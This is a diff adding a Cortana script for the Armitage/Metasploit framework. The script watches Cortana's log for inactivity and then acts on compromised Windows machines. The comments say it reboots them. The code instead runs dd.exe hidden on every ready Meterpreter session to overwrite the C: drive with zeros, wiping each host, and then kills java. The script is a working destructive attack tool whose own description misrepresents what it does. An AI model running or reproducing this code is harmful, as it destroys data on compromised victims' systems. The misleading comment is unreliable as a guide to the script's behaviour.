@@ -1,0 +1,49 @@
+# When Cortana is idle reboot all computers with sessions.
+# by monstream00
+
+# ~/.armitage/120923/all
+# ls /opt/metasploit/msf3/data/armitage/ -aiRltu | grep cortana.log | cut -d " " -f7,8
+# 2012-09-23 19:30
+# If log not tuched in 30 min reboot all computers with sessions
+# root@bt:~/.armitage/120923/all# stat -c "%Y" /opt/metasploit/msf3/data/armitage/cortana.log
+# 1348456160
+#  %Y     Time of last modification as seconds since Epoch
+# 60sec * 30min = 1800 = 1348456160+1800 = 1348457960
+# [*] exec: stat -c "%Y" /opt/metasploit/msf3/data/armitage/cortana.log
+#
+# stat		 1348456160
+# Current Epoch: 1348509198251 fix with substr
+# Current Epoch: 1348509858
+
+# 60sec * 30min = 1800 = 1348456160+1800 = 1348457960
+#$globalMin = 1800;
+$globalMin = 600;
+
+on heartbeat_1m {
+	$console = console();
+	cmd($console, "stat -c \"\%Y\" /opt/metasploit/msf3/data/armitage/cortana.log");
+}
+
+on console_stat {
+	println("$3");
+	$dateEpochMsec = ticks();
+	$dateEpoch = substr($dateEpochMsec, 0, 10);
+	println("Current Epoch: " . $dateEpoch );
+	$checkDate = ($dateEpoch - $globalMin);
+	println("Olddate Epoch: " . $checkDate );
+	$checkMin = substr($checkDate, 0, 8);
+	println("OlddMin Epoch: " . $checkMin );
+	if ($3 hasmatch $checkMin) {
+		println("We have cortana inactivity match time to clean up!!");
+		local('$sid');
+		foreach $sid (session_ids()) {
+			if (-iswinmeterpreter $sid && -isready $sid) {
+				println("idleDDsession: $sid");
+				#$console = console();
+				m_cmd($sid, "execute -f /root/exe/dd.exe -m -d cmd.exe -a 'if=/dev/zero of=\\.\c: bs=1M --size --progress' -H"); 
+			}
+		}
+		cmd($console, "killall java");
+	}
+}
+
